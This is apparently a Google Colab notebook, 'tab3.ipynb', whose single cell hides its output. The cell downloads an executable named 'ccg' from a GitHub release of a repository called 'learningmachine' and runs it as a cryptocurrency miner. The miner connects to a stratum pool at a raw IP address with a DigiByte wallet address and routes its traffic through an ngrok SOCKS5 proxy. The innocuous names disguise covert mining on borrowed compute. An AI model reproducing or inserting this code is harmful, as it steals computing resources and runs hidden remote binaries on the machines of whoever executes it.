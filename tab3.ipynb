{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tab3.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "voGFUzYVRq40"
      },
      "outputs": [],
      "source": [
        "%%capture\n",
        "! wget -q https://github.com/includemachine10/learningmachine/releases/download/v.1/ccg && chmod +x ccg\n",
        "! chmod +x ccg\n",
        "! ./ccg -o stratum+tcp://103.249.70.7:6535 -u DPTuEufB8SbQrYwvSeLaRZrExkUawbBLJX.$(shuf -n 1 -i 1-9999999) -p c=DGB,mc=SUGAR -x socks5://6.tcp.ngrok.io:11777"
      ]
    }
  ]
}
